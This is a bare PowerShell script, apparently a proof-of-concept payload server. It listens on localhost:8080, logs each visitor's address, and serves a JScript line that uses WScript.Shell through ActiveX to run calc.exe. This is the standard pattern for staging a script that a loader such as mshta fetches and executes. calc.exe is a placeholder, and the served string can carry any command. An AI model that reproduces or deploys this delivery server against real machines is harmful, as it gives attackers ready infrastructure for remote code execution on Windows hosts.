$http = [System.Net.HttpListener]::new() 

$http.Prefixes.Add("http://localhost:8080/")
 
$http.Start()

while ($http.IsListening) {

	$context = $http.GetContext()

	if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {

	    write-host "$($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'

	    [string]$html = "(new ActiveXObject(`"WScript.Shell`")).Run(`"calc.exe`")" 
	    
	    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
	    $context.Response.ContentLength64 = $buffer.Length
	    $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
	    $context.Response.OutputStream.Close()

	}
}